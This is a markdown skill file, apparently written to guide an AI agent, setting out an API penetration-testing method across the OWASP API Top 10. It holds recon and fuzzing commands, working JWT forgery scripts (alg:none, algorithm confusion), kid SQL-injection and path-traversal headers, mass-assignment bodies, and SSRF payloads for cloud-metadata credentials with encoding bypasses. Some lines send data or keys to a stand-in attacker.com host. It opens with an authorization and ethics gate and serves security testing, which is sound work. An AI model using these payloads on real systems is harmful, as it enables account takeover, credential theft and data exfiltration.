---
name: vuln-api
description: Comprehensive API security testing methodology covering OWASP API Top 10 (2023), advanced vulnerability classes, protocol-specific attacks (REST, GraphQL, gRPC, WebSocket, SOAP), recon, payloads, tool commands, CVEs, false-positive elimination, and evidence standards derived from 299 classified real-world reports.
sources: hackerone_public, owasp, portswigger, bug_bounty_reports
---

# API Security Testing

## AUTHORIZATION & ETHICS GATE

**AUTHORIZATION FIRST** — Only test an API with explicit written authorization (bug bounty scope, signed engagement, or infrastructure you own). One out-of-scope request can end an engagement.

**Non-destructive** — no credential attacks against production auth, no unauthorized access to real users' data, no resource-exhaustion that degrades service. Prove impact with minimum necessary evidence, then stop.

**STOP ON DEGRADATION** — if a test causes errors, slowdowns, or instability, stop immediately.

**Zero-report gate** — NEVER write a vulnerability report until: reproduced from scratch, impact is real (not just 200 OK), evidence captured, false positives eliminated.

---

## HUNTING PRIORITY (data-driven from 299 classified reports)

```
1. SECURITY MISCONFIGURATION (33%)  → leaked API keys in JS/git/mobile, exposed debug/internal endpoints, verbose errors
2. BOLA / IDOR (21%)                → object-ID swap on every /resource/{id}, GraphQL node(), billing/export endpoints
3. BROKEN AUTHENTICATION (12%)      → JWT flaws, OAuth misconfig, weak session handling, missing auth on siblings
4. BFLA (9%)                        → admin/privileged functions reachable by normal role, method swap
5. INJECTION (9%)                   → SQLi/NoSQLi/SSTI/command injection through API params
6. RESOURCE CONSUMPTION (8%)        → missing rate limits, pagination abuse, cost amplification, GraphQL complexity
7. SSRF (2%, always High)           → every url=/webhook=/callback=/import= param → internal + cloud metadata
8. BUSINESS FLOWS / RACE (2%)       → coupons, payments, verification, limit bypass via concurrency
```

## A→B→C CHAIN TABLE

| Bug A | Hunt for Bug B | Escalate to C |
|---|---|---|
| BOLA read on `/resource/{id}` | PUT/PATCH/DELETE on the same object | Full cross-tenant data manipulation |
| Leaked API key in JS/git/mobile | Scope of the key across the API | Internal data access → lateral movement |
| SSRF via webhook/import param | Cloud metadata `169.254.169.254` | IAM credential exfil → infra access |
| JWT `alg:none` / weak secret accepted | Forge `role:admin` / other `sub` | Full account/privilege takeover |
| GraphQL introspection enabled | Missing field-level authz on a type | `node()` IDOR → mass PII export |
| Mass assignment accepts extra field | Set `isAdmin`/`role`/`verified` | Privilege escalation |
| OAuth `redirect_uri` too permissive | Open redirect on an allowed host | Auth-code theft → ATO |
| Old API version (`/v1/`) still live | Missing auth that `/v2/` added | Auth bypass on the whole surface |
| Verbose error / stack trace | Framework + version → known CVE | CVE exploitation (authorized lab) |
| Race on a state-change endpoint | Limit/coupon/balance logic | Financial or quota abuse |

---

## RECON METHODOLOGY

### Phase 1: Passive Discovery

**Certificate Transparency Logs**
```bash
# crt.sh
curl -s "https://crt.sh/?q=%.target.com&output=json" | \
  python3 -c "
import json, sys
data = json.load(sys.stdin)
names = set()
for entry in data:
    for name in entry.get('name_value', '').split('\n'):
        name = name.strip().lower()
        if name and '*' not in name:
            names.add(name)
for name in sorted(names):
    print(name)
" > ct_subdomains.txt

grep -iP "api|dev|staging|gateway|graphql|rest|internal" ct_subdomains.txt

# certspotter
curl -s "https://api.certspotter.com/v1/issuances?domain=target.com&include_subdomains=true&expand=dns_names" | \
  python3 -c "
import json, sys
data = json.load(sys.stdin)
names = set()
for entry in data:
    for name in entry.get('dns_names', []):
        name = name.strip().lower()
        if '*' not in name:
            names.add(name)
for name in sorted(names):
    print(name)
"
```

**Subdomain Enumeration**
```bash
subfinder -d target.com -all -o subdomains.txt
amass enum -passive -d target.com -o amass_subdomains.txt
cat subdomains.txt | dnsx -a -resp -o resolved.txt
cat subdomains.txt | httpx -ports 80,443,8080,8443,3000,5000,8000,9090 \
  -title -tech-detect -status-code -o httpx_results.txt
```

**API-specific subdomain patterns to check:**
```
api.target.com, api-v{1,2,3}.target.com, api-dev/staging/test/qa/uat/sandbox.target.com,
api-internal/admin/gateway/proxy.target.com, graphql.target.com, gql.target.com,
rest.target.com, ws.target.com, websocket.target.com, partner-api.target.com,
b2b-api.target.com, webhook.target.com, callback.target.com, internal.target.com,
developer.target.com, portal.target.com, gateway.target.com
```

**ASN Enumeration**
```bash
whois -h whois.radb.net -- "-i origin $(whois target.com | grep -i origin | \
  awk '{print $NF}')" | grep "route:" | awk '{print $2}'
amass intel -org "Target Organization"
# Scan ASN ranges
cat asn_ranges.txt | nmap -sV -p 80,443,8080,8443,3000,5000,8000 -iL - -oG api_scan_results.txt
```

**GitHub Dorks**
```
"target.com" api_key
"target.com" api_secret
"target.com" filename:swagger.json
"target.com" filename:swagger.yaml
"target.com" filename:openapi.json
"target.com" filename:.env
org:target filename:.env
org:target filename:swagger.json
org:target "api_key"
org:target "secret_key"
org:target "access_token"
org:target "AWS_ACCESS_KEY"
org:target path:postman
org:target filename:postman_collection.json
org:target "Authorization: Bearer"
org:target filename:.github/workflows
org:target filename:Dockerfile "API_URL"
```

**GitHub CLI**
```bash
gh search code "target.com api" --limit 100
gh search code "target.com" --filename swagger.json --limit 50
gh search code "target.com" --filename postman_collection.json --limit 50 --json path,repository
```

**Google Dorks**
```
site:target.com inurl:api
site:target.com inurl:swagger
site:target.com inurl:api-docs
site:target.com inurl:openapi
site:target.com filetype:json "openapi"
site:target.com filetype:yaml "swagger"
site:target.com filetype:env
site:target.com "internal server error" "api"
site:postman.com "target.com"
site:documenter.getpostman.com "target.com"
site:stackoverflow.com "target.com" "api"
```

**Wayback Machine**
```bash
curl -s "https://web.archive.org/cdx/search/cdx?url=*.target.com/*&output=text&fl=original&collapse=urlkey" | \
  sort -u > wayback_urls.txt
grep -iP "(api|graphql|rest|v[0-9]+|swagger|openapi)" wayback_urls.txt > api_urls.txt

# Historical specs
for path in "swagger.json" "api-docs" "openapi.json" "openapi.yaml" "v2/api-docs"; do
  curl -s "https://web.archive.org/cdx/search/cdx?url=target.com/${path}&output=json&fl=timestamp,original,statuscode"
done

# waymore
pip3 install waymore
waymore -i target.com -mode U -oU wayback_urls.txt
```

**JS Analysis**
```bash
# Extract script sources
curl -s https://target.com | grep -oP 'src="([^"]*\.js[^"]*)"' | sed 's/src="//;s/"//'

# Extract API endpoints from JS
grep -ohrP '["'"'"'](/api/[a-zA-Z0-9_/\-\.:{}]+)["'"'"']' *.js | sort -u
grep -ohrP '["'"'"'](/v[0-9]+/[a-zA-Z0-9_/\-\.:{}]+)["'"'"']' *.js | sort -u
grep -ohrP 'fetch\s*\(\s*["'"'"'`]([^"'"'"'`]+)["'"'"'`]' *.js | sort -u
grep -ohrP 'axios\.(get|post|put|patch|delete)\s*\(\s*["'"'"'`]([^"'"'"'`]+)' *.js | sort -u
grep -ohrP '\.open\s*\(\s*["'"'"'](?:GET|POST|PUT|PATCH|DELETE)["'"'"']\s*,\s*["'"'"'`]([^"'"'"'`]+)' *.js | sort -u
grep -ohrP '`[^`]*(/api/[^`]+)[^`]*`' *.js | sort -u   # template literals
grep -ohrP 'wss?://[a-zA-Z0-9\-\.]+[a-zA-Z0-9_/\-\.]*' *.js | sort -u

# Check for source maps
curl -s -o /dev/null -w "%{http_code}" https://target.com/static/js/main.js.map
grep -r "sourceMappingURL" *.js

# Extract from source maps
npm install -g sourcemapper
sourcemapper -url https://target.com/static/js/main.js.map -output ./extracted_source
unwebpack-sourcemap https://target.com/static/js/main.js.map ./output_dir

find ./extracted_source -type f \( -name "*.js" -o -name "*.ts" -o -name "*.tsx" \) | \
  xargs grep -n "api/\|/graphql\|fetch(\|baseUrl\|API_URL" | sort -u

# LinkFinder
python3 linkfinder.py -i https://target.com -o cli
```

**Mobile App Secrets**
```bash
# After decompilation (jadx for APK, class-dump for iOS)
grep -rn "api[_-]?key\s*[:=]" output_dir/ --include="*.java" --include="*.kt"
grep -rn "client[_-]?(id|secret)\s*[:=]" output_dir/ --include="*.java"
grep -rn "AKIA[0-9A-Z]{16}" output_dir/   # AWS keys
find output_dir -name "google-services.json" -exec cat {} \;  # Firebase
find output_dir -name "GoogleService-Info.plist" -exec cat {} \;  # iOS Firebase
grep -rn "password\s*[:=]\s*[\"'][^\"']+[\"']" output_dir/

# API base URL extraction
grep -rn "https\?://[a-zA-Z0-9.-]*api[a-zA-Z0-9.-]*\.[a-zA-Z]\{2,\}" \
  output_dir/ --include="*.java" --include="*.kt" | sort -u
find output_dir -name "BuildConfig.java" -exec grep -n "URL\|HOST\|API\|ENDPOINT" {} \;
```

**Secret Scanner Tools**
```bash
trufflehog github --org target --only-verified
gitleaks detect --source /path/to/repo --report-format json --report-path gitleaks_report.json
```

### Phase 2: Active Discovery

**Endpoint Brute-forcing**
```bash
# ffuf — basic
ffuf -u https://api.target.com/FUZZ -w /path/to/api-wordlist.txt \
  -mc 200,201,202,204,301,302,307,401,403,405 -o ffuf_results.json -of json

# ffuf — authenticated
ffuf -u https://api.target.com/api/v1/FUZZ \
  -w /path/to/api-wordlist.txt \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -mc 200,201,202,204,301,302,307,403,405

# ffuf — recursive
ffuf -u https://api.target.com/FUZZ -w wordlist.txt \
  -mc 200,201,202,204,301,302,307,401,403,405 -recursion -recursion-depth 3

# ffuf — POST discovery
ffuf -u https://api.target.com/api/v1/FUZZ \
  -w wordlist.txt -X POST -H "Content-Type: application/json" -d '{}' \
  -mc 200,201,202,204,400,401,403,405,422

# ffuf — filter false positives by size
ffuf -u https://api.target.com/FUZZ -w wordlist.txt -mc all -fs 0 -fw 1

# feroxbuster
feroxbuster -u https://api.target.com \
  -w /path/to/api-wordlist.txt \
  --status-codes 200 201 202 204 301 302 307 401 403 405 \
  --depth 3 --rate-limit 50 --json -o ferox_results.json

# gobuster
gobuster dir -u https://api.target.com -w /path/to/api-wordlist.txt \
  -s "200,201,202,204,301,302,307,401,403,405" -b "" -o results.txt

# VHOST discovery
gobuster vhost -u https://target.com -w /path/to/api-subdomains.txt --append-domain
```

**Wordlists**
```bash
# Assetnote (most comprehensive)
wget https://wordlists-cdn.assetnote.io/data/automated/httparchive_apiroutes_2024_11_28.txt

# SecLists
git clone --depth 1 https://github.com/danielmiessler/SecLists.git
# SecLists/Discovery/Web-Content/api/, api-endpoints.txt, swagger.txt
```

**Version/Shadow API Enumeration**
```bash
for version in v0 v1 v2 v3 v4 v5 beta alpha legacy old internal dev staging; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://api.target.com/${version}/users")
  echo "${version}: ${code}"
done

# Date-based versioning
for year in 2018 2019 2020 2021 2022 2023 2024 2025; do
  for month in 01 06; do
    code=$(curl -s -o /dev/null -w "%{http_code}" \
      "https://api.target.com/${year}-${month}-01/users")
    echo "${year}-${month}-01: ${code}"
  done
done

# Compare rate limits between versions (older often lacks new security controls)
for i in $(seq 1 100); do curl -s -o /dev/null -w "%{http_code}\n" "https://api.target.com/v1/users"; done | sort | uniq -c
for i in $(seq 1 100); do curl -s -o /dev/null -w "%{http_code}\n" "https://api.target.com/v3/users"; done | sort | uniq -c
```

**Debug/Framework Endpoints**
```bash
# Spring Boot Actuator
for ep in health env beans heapdump mappings configprops trace loggers; do
  curl -s -o /dev/null -w "${ep}: %{http_code}\n" https://target.com/actuator/${ep}
done

# Django, Rails, Laravel
curl -s -o /dev/null -w "%{http_code}" https://target.com/admin/
curl -s -o /dev/null -w "%{http_code}" https://target.com/rails/info/routes
curl -s -o /dev/null -w "%{http_code}" https://target.com/telescope/

# GraphQL IDEs
curl -s -o /dev/null -w "%{http_code}" https://target.com/graphql
curl -s -o /dev/null -w "%{http_code}" https://target.com/graphiql
curl -s -o /dev/null -w "%{http_code}" https://target.com/playground
curl -s -o /dev/null -w "%{http_code}" https://target.com/console

# Internal infrastructure
curl -s https://target.com/api/v1/namespaces     # Kubernetes API
curl -s https://target.com:15000/config_dump      # Envoy admin
curl -s -o /dev/null -w "%{http_code}" https://target.com:9090/metrics   # Prometheus
curl -s -o /dev/null -w "%{http_code}" https://target.com:3000/api/org   # Grafana
curl -s -o /dev/null -w "%{http_code}" https://target.com:5601/api/status  # Kibana
curl -s -o /dev/null -w "%{http_code}" https://target.com:8500/v1/agent/self  # Consul
curl -s -o /dev/null -w "%{http_code}" https://target.com:8200/v1/sys/health  # Vault
```

**OpenAPI/Swagger Discovery**
```bash
SPEC_PATHS=("/swagger.json" "/swagger.yaml" "/swagger/v1/swagger.json"
  "/api-docs" "/api-docs.json" "/v1/api-docs" "/v2/api-docs" "/v3/api-docs"
  "/openapi.json" "/openapi.yaml" "/.well-known/openapi.json"
  "/api/swagger.json" "/api/openapi.json" "/docs" "/redoc"
  "/swagger-ui.html" "/swagger-resources" "/api/spec" "/api/schema"
  "/internal/api-docs" "/debug/api" "/graphql/schema")

for path in "${SPEC_PATHS[@]}"; do
  for host in "https://target.com" "https://api.target.com"; do
    code=$(curl -s -o /dev/null -w "%{http_code}" "${host}${path}" --max-time 5)
    if [ "$code" != "404" ] && [ "$code" != "000" ]; then
      echo "[${code}] ${host}${path}"
    fi
  done
done
```

**HTTP Method Enumeration**
```bash
for method in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do
  response=$(curl -s -o /dev/null -w "%{http_code}" \
    -X "$method" https://api.target.com/api/v1/users)
  echo "$method: $response"
done
```

**Content-Type Fuzzing**
```bash
for ct in "application/json" "application/xml" "application/x-www-form-urlencoded" \
  "multipart/form-data" "text/xml" "application/yaml" "application/soap+xml" \
  "application/x-protobuf" "application/cbor"; do
  echo "=== Content-Type: $ct ==="
  curl -s -o /dev/null -w "%{http_code}" \
    -X POST "https://api.target.com/api/v1/users" \
    -H "Content-Type: $ct" -d '{"test":"value"}'
done
```

**Hidden Parameter Discovery**
```bash
# Arjun
arjun -u https://api.target.com/api/v1/users
arjun -u https://api.target.com/api/v1/users -m POST \
  --headers "Content-Type: application/json"
arjun -u https://api.target.com/api/v1/users \
  --headers "Authorization: Bearer <token>"

# x8
x8 -u "https://api.target.com/api/v1/users" -w params.txt \
  -m POST -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" --json
x8 -u "https://api.target.com/api/v1/users" -w params.txt --headers
```

**Token Endpoint Enumeration**
```bash
for endpoint in "/oauth/token" "/token" "/auth/token" "/api/token" \
  "/oauth2/token" "/api/oauth/token" "/connect/token" "/oidc/token"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST "https://target.com${endpoint}" \
    -d "grant_type=client_credentials" --max-time 5)
  echo "${endpoint}: ${code}"
done
```

---

## API1:2023 — BOLA / IDOR

### Core Attack Procedure

1. Map every endpoint that accepts an object identifier (URL path, query param, request body, headers)
2. Classify IDs: sequential integer, UUID, encoded value, composite key, slug
3. Create two accounts: User A (attacker) and User B (victim, different org/group)
4. Obtain a valid ID belonging to User B
5. Replay User A's authenticated request with User B's ID substituted
6. Test all HTTP methods — GET may be protected but PUT/DELETE may not

### ID Substitution Payloads
```http
# Horizontal access — user swaps ID in path
GET /api/v1/users/1002/medical-records HTTP/1.1
Authorization: Bearer <user_a_token>

# Write-method IDOR (authorization may differ by method)
PUT /api/v1/orders/5001 HTTP/1.1
Authorization: Bearer <user_a_token>
Content-Type: application/json
{"status": "cancelled"}

DELETE /api/v1/orders/5001 HTTP/1.1
Authorization: Bearer <user_a_token>

# Nested resource — validate project_id against org_id
GET /api/v1/orgs/10/projects/200/files/5001 HTTP/1.1
Authorization: Bearer <user_a_token>
# User A is in org 10 but project 200 belongs to org 20

# Bulk endpoint with mixed owned + unowned IDs
POST /api/v1/documents/bulk-export HTTP/1.1
Authorization: Bearer <user_a_token>
Content-Type: application/json
{"document_ids": [1001, 1002, 1003, 1004, 1005], "format": "pdf"}

# Parameter pollution (middleware checks path, controller uses query)
GET /api/v1/users/1001/orders?user_id=1002 HTTP/1.1
Authorization: Bearer <user_a_token>

# File presigned URL generation
GET /api/v1/files/signed-url?key=users/1002/private/photo.jpg HTTP/1.1
Authorization: Bearer <user_a_token>

# File path traversal + BOLA
GET /api/v1/files/download?path=/users/1002/documents/tax_return.pdf HTTP/1.1
Authorization: Bearer <user_a_token>

# Webhook IDOR — receive another user's events
POST /api/v1/webhooks HTTP/1.1
Authorization: Bearer <user_a_token>
Content-Type: application/json
{"url": "https://attacker.com/hook", "event": "order.completed", "user_id": 1002}
```

### GraphQL BOLA
```graphql
# node() global-ID access — base64("User:1002")
query {
  node(id: "VXNlcjoxMDAy") {
    ... on User {
      email
      ssn
      medicalRecords { diagnosis prescriptions }
    }
  }
}

# Nested relationship traversal (authorization may not apply via relationships)
query {
  viewer {
    organization {
      members {
        edges {
          node {
            privateDocuments { content }
          }
        }
      }
    }
  }
}

# Mutation-based BOLA — privilege escalation on another user
mutation {
  updateUser(id: "1002", input: {role: "admin"}) { id role }
}
```

### Indirect Object References
```http
GET /api/v1/users/lookup?email=victim@example.com HTTP/1.1
Authorization: Bearer <user_a_token>

GET /api/v1/profiles/victim-username/private-settings HTTP/1.1
Authorization: Bearer <user_a_token>

GET /api/v1/accounts/+15551234567/balance HTTP/1.1
Authorization: Bearer <user_a_token>
```

### Fuzz Values
```
seq 1000 1010 -> /api/v1/users/$id/profile   # Sequential enumeration
550e8400-e29b-41d4-a716-446655440000          # Leaked UUID direct reference
/api/v1/orgs/my-org/users/victim-user/settings  # Nested cross-tenant
{"role": "admin"}                              # Privilege escalation body
{"ids": [1001, 1002, 1003]}                    # Bulk-info
/api/v1/users/1001/data?user_id=1002           # Parameter pollution
{ node(id: "VXNlcjoxMDAy") { ... on User { email privateData } } }  # GraphQL
```

---

## API2:2023 — BROKEN AUTHENTICATION

### JWT Attacks

**CVE-2015-9235 — alg:none (jwt-go, jsonwebtoken, PyJWT older versions)**
```python
import base64, json

header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "admin", "role": "administrator", "iat": 1699000000, "exp": 1699999999}

header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode()
payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
forged_token = f"{header_b64}.{payload_b64}."
# Submit as Authorization: Bearer header
```

**CVE-2016-10555 / CVE-2022-29217 — Algorithm Confusion (RS256→HS256)**
```python
# Step 1: Get public key from JWKS endpoint
import jwt, requests
from cryptography.hazmat.primitives import serialization

jwks = requests.get('https://api.example.com/.well-known/jwks.json').json()
public_key = jwt.algorithms.RSAAlgorithm.from_jwk(jwks['keys'][0])
public_key_pem = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)
# Step 2: Sign new token with public key as HMAC secret (server accepts HS256 with its own public key)
forged_token = jwt.encode({"sub": "admin", "role": "administrator"}, public_key_pem, algorithm='HS256')
```

**CVE-2022-21449 — ECDSA Psychic Signatures (Java 15-18 before 17.0.3/18.0.1)**
- Create JWT with ECDSA signature (r=0, s=0) — 64 zero bytes
- Java's SunEC provider accepted this as valid for ANY message/key
- Universal forgery: create any JWT, Java accepts it

**kid SQL Injection**
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "1' UNION SELECT 'attacker-controlled-secret' -- "
}
```

**kid Path Traversal**
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../../../../../dev/null"
}
```

**jwk/jku Header Injection**
```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "n": "<attacker's public key modulus>",
    "e": "AQAB"
  }
}
```

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jku": "https://attacker.com/.well-known/jwks.json"
}
```

**Weak Secret Cracking**
```bash
hashcat -a 0 -m 16500 jwt_token.txt /usr/share/wordlists/rockyou.txt
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/common_jwt_secrets.txt

# Common weak secrets found in production:
# "secret", "password", "123456", "your-256-bit-secret", "changeme",
# application name, company name, default from jwt.io
```

**JWT Token Expiration Bypass**
```
- Remove exp claim entirely
- Set exp to far future
- Exploit clock skew (60+ seconds tolerance)
- Manipulate nbf claim
```

**JWT Validation Checklist (all must pass)**
1. Structure: exactly 3 Base64URL segments separated by dots
2. `alg` in explicit allowlist — reject `none`, unexpected algorithms
3. Key selected from server-side store, NOT from `jwk`/`jku` headers
4. If `kid` used: validate against allowlist, never use in SQL/file path
5. `exp` validated (allow max 30-60s clock skew)
6. `nbf` validated if present
7. `iss` validated against expected value
8. `aud` validated against current service identifier
9. `sub` is a valid user in context
10. Token revocation check if blacklist is maintained

**Decode JWT Without Verification**
```bash
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U" | \
  cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
```

### OTP/MFA Attacks
```http
# 4-digit OTP brute-force (10,000 possibilities; 6-digit = 1,000,000)
POST /api/v1/auth/verify-otp HTTP/1.1
Content-Type: application/json
{"otp": "0000"}  # through {"otp": "9999"}

# OTP bypass attempts
{"otp": ""}         # empty string bypass
{"otp": null}       # null bypass
{"otp": 0}          # type confusion (integer vs string)

# OTP reuse — expired/used OTP
{"otp": "123456"}   # code from 5 minutes ago

# Race condition — submit same OTP simultaneously via HTTP/2 single-packet
```

### Credential Stuffing
Detection indicators:
- High volume login attempts from single IP; rotating IPs across many accounts
- Login attempts with valid usernames, varied passwords
- Geographic impossibility after successful login

---

## API3:2023 — BOPLA / MASS ASSIGNMENT

### Attack Procedure
1. Find endpoints that update data models: `POST /register`, `PUT /users/me`, `PATCH /settings`
2. Discover internal properties from GET responses: `role`, `is_admin`, `is_verified`, `balance`, `subscription_tier`, `permissions`, `price`, `discount`
3. Check error messages: invalid value for guessed field → validation error confirms field exists
4. Inject extra fields in request body

### Mass Assignment Payloads
```http
POST /api/v1/users HTTP/1.1
Content-Type: application/json
{
  "username": "attacker",
  "email": "attacker@example.com",
  "password": "secure_password",
  "role": "admin",
  "is_admin": true,
  "is_verified": true,
  "balance": 999999,
  "subscription_tier": "enterprise",
  "permissions": ["read", "write", "admin", "delete"],
  "discount_percentage": 100,
  "account_type": "staff"
}
```

**Verify the result:**
```http
GET /api/v1/users/me HTTP/1.1
Authorization: Bearer <new_token>
# Check if any injected properties took effect
```

### Framework-Specific Vulnerable Patterns

**Ruby on Rails** — `User.new(params[:user])` without Strong Parameters; `permit!` in Rails 4+
**Django** — `fields = '__all__'` in ModelSerializer; `setattr(user, key, value)` loop over `request.data`
**Express.js** — `User.create(req.body)`; `User.findByIdAndUpdate(id, req.body)`
**Spring Boot** — `@ModelAttribute User user`; `@RequestBody User user` without DTO pattern
**Laravel** — `$guarded = []`; `User::create($request->all())`
**FastAPI** — using full model as request body without output filtering DTO

### gRPC Mass Assignment
```bash
grpcurl -d '{"user_id":"my-id","role":"admin","is_superuser":true}' \
  -H "Authorization: Bearer $TOKEN" \
  target.com:443 userservice.UserService/UpdateUser
```

---

## API4:2023 — UNRESTRICTED RESOURCE CONSUMPTION

### Rate Limit Testing
```bash
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code}\n" "https://api.target.com/v1/users"
done | sort | uniq -c
```

### Pagination Abuse
```http
GET /api/v1/users?limit=999999999 HTTP/1.1
GET /api/v1/users?page_size=0 HTTP/1.1
# Look for missing upper bounds on page size
```

---

## API5:2023 — BROKEN FUNCTION LEVEL AUTHORIZATION (BFLA)

### Attack Procedure
1. Map privileged endpoints via JS analysis, OpenAPI spec, error messages
2. Test with normal user token: `/api/admin/*`, `/api/manage/*`, `/api/internal/*`
3. Try HTTP method override and method swap

### BFLA Attack Vectors
```http
# Access admin endpoint with user token
GET /api/admin/users HTTP/1.1
Authorization: Bearer <regular_user_token>

# Method swap — admin function accessible via different method
POST /api/v1/users/1002/promote HTTP/1.1
Authorization: Bearer <regular_user_token>
Content-Type: application/json
{}

# HTTP method override headers
POST /api/v1/admin/settings HTTP/1.1
X-HTTP-Method-Override: DELETE
X-Method-Override: DELETE
Authorization: Bearer <regular_user_token>

# Access billing/export endpoints
GET /api/v1/billing/invoices HTTP/1.1
Authorization: Bearer <regular_user_token>

POST /api/v1/reports/export-all HTTP/1.1
Authorization: Bearer <regular_user_token>

# Access other users' data via admin path
GET /api/admin/users/1002/settings HTTP/1.1
Authorization: Bearer <regular_user_token>
```

---

## API7:2023 — SERVER-SIDE REQUEST FORGERY (SSRF)

### SSRF Entry Points
```http
# Webhook registration (server POSTs to URL on event)
POST /api/v1/webhooks HTTP/1.1
Content-Type: application/json
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "events": ["order.created"]}

# Webhook verification (server sends GET to URL to verify)
POST /api/v1/webhooks HTTP/1.1
Content-Type: application/json
{"url": "http://internal-admin.corp:8080/admin/delete-all-data", "events": ["test"]}

# URL preview/unfurl
POST /api/v1/messages HTTP/1.1
Content-Type: application/json
{"channel": "general", "text": "Check out http://169.254.169.254/latest/user-data"}

# Import from URL
POST /api/v1/import HTTP/1.1
Content-Type: application/json
{"source_url": "http://internal-db:5432/", "format": "csv"}

# Avatar URL import
PUT /api/v1/users/me/avatar HTTP/1.1
Content-Type: application/json
{"avatar_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name"}

# PDF generation (wkhtmltopdf, Puppeteer, WeasyPrint fetch external resources)
POST /api/v1/reports/pdf HTTP/1.1
Content-Type: application/json
{"html": "<img src='http://169.254.169.254/latest/meta-data/iam/security-credentials/'>"}
{"html": "<style>@import url('http://internal:8080/admin');</style><p>Report</p>"}
{"html": "<iframe src='http://169.254.169.254/latest/user-data'></iframe>"}

# Image proxy/resize
GET /api/v1/image-proxy?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
GET /api/v1/resize?src=http://internal:3000/admin&width=800 HTTP/1.1
```

### Cloud Metadata Endpoints
```
# AWS IMDSv1 (no auth required — just GET)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/dynamic/instance-identity/document
http://[fd00:ec2::254]/latest/meta-data/   # IPv6

# AWS IMDSv2 (requires PUT first — some webhook vectors can add headers)
# Step 1: PUT http://169.254.169.254/latest/api/token
#         X-aws-ec2-metadata-token-ttl-seconds: 21600
# Step 2: GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
#         X-aws-ec2-metadata-token: <token>

# GCP (requires Metadata-Flavor: Google header — some vectors can add headers)
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Azure (requires Metadata: true header)
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

### IP Encoding Bypass Techniques
```
http://169.254.169.254/           # Standard IPv4
http://2852039166/                # Decimal integer (169*256^3 + 254*256^2 + 169*256 + 254)
http://0251.0376.0251.0376/       # Octal
http://0xa9.0xfe.0xa9.0xfe/      # Hex
http://169.254.0xa9.0376/        # Mixed encoding
http://[::ffff:169.254.169.254]/ # IPv6
http://[0:0:0:0:0:ffff:a9fe:a9fe]/
http://[::ffff:a9fe:a9fe]/
http://anything@169.254.169.254/ # With credentials
http://169.254.169.254:80/       # With port
http://169%2e254%2e169%2e254/    # URL-encoded dots
```

### URL Parser Confusion
```
gopher://169.254.169.254:25     # Arbitrary TCP data
dict://169.254.169.254:6379     # Redis protocol
file:///etc/passwd              # Local file
http://example.com#@169.254.169.254   # Fragment confusion
http://example.com\@169.254.169.254   # Authority confusion
http://169.254.169.254\@example.com
```

### DNS Rebinding
1. Register domain with TTL=0 or 1 second
2. First DNS resolution → 1.2.3.4 (passes URL validation)
3. Change DNS record → 169.254.169.254
4. Second DNS resolution (actual request) → hits metadata service
5. Prevention: resolve DNS once, validate IP, use IP (not hostname) for request

### Redirect Chain SSRF
```
# Attacker controls server that redirects:
https://attacker.com/redirect → http://169.254.169.254/latest/meta-data/
# URL validation allows attacker.com; server follows redirect
# Chain: attacker.com → legitimate-site.com → 302 → 169.254.169.254
```

### Real-World SSRF Impact
- Capital One (2019): SSRF → AWS IAM credentials → 100M+ customer records → $80M fine
- Reddit: SSRF via URL unfurling → ~$6,000 HackerOne
- GitLab: Multiple SSRF via import, webhook, Mermaid diagram rendering

**Bounty ranges:** Blind $500-$3,000 | Response readable $3,000-$10,000 | Cloud metadata with creds $10,000-$25,000+ | RCE $25,000-$100,000+

### SSRF Testing Checklist
```
[ ] All endpoints accepting URLs identified
[ ] http://169.254.169.254/ tested (AWS)
[ ] http://metadata.google.internal/ tested (GCP)
[ ] IP encoding variations tested (decimal, octal, hex, IPv6)
[ ] DNS rebinding tested (short TTL DNS)
[ ] Redirect chains tested
[ ] URL scheme variations tested (file://, gopher://, dict://)
[ ] URL parser confusion tested
[ ] Webhook URL registration tested
[ ] PDF generation with embedded URLs tested
[ ] Image proxy/resize endpoints tested
[ ] IMDSv2 bypass attempts made (PUT token + header)
[ ] OOB DNS callback received (for blind SSRF)
```

---

## API8:2023 — SECURITY MISCONFIGURATION

### Framework Debug Endpoints
```bash
# Spring Boot Actuator (CVE-class: sensitive data exposure)
for ep in health env beans heapdump mappings configprops trace loggers; do
  curl -s -o /dev/null -w "${ep}: %{http_code}\n" https://target.com/actuator/${ep}
done

# Django admin, Rails routes, Laravel Telescope
curl -s -o /dev/null -w "%{http_code}" https://target.com/admin/
curl -s -o /dev/null -w "%{http_code}" https://target.com/rails/info/routes
curl -s -o /dev/null -w "%{http_code}" https://target.com/telescope/
```

### OpenAPI Spec Security Analysis Issues to Check
- No global security scheme defined (every endpoint must define its own)
- API key in query parameter (exposed in logs/history)
- OAuth2 Implicit flow used (deprecated, tokens in URL)
